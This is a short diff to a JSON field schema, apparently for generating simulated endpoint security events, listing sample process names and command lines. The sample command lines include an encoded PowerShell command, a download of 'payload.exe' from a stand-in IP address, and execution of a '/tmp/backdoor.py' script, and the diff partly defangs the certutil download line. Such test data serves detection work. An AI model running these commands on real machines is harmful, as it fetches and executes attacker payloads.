@@ -23,7 +23,7 @@
     { "name": "DeviceTargetValue", "type": "string", "values": ["LOW", "MEDIUM", "HIGH", "MISSION_CRITICAL"] },
     { "name": "DeviceLocation", "type": "string", "values": ["ONSITE", "OFFSITE", "UNKNOWN"] },
     { "name": "ProcessName", "type": "string", "values": ["powershell.exe", "cmd.exe", "rundll32.exe", "certutil.exe", "python3", "bash", "creddumpsim.exe", "wscript.exe"] },
-    { "name": "ProcessCmdline", "type": "string", "values": ["powershell.exe -EncodedCommand SQBFAFgA...", "cmd.exe /c whoami /priv", "certutil.exe -urlcache -split -f http://203.0.113.42/payload.exe", "python3 /tmp/backdoor.py"] },
+    { "name": "ProcessCmdline", "type": "string", "values": ["powershell.exe -EncodedCommand RABFAE0ATwA...", "cmd.exe /c whoami /priv", "democert.exe -fetch -f http://203.0.113.42/payload.exe", "python3 /tmp/backdoor.py"] },
     { "name": "ProcessSha256", "type": "string" },
     { "name": "ProcessMd5", "type": "string" },
     { "name": "ProcessPid", "type": "string" },
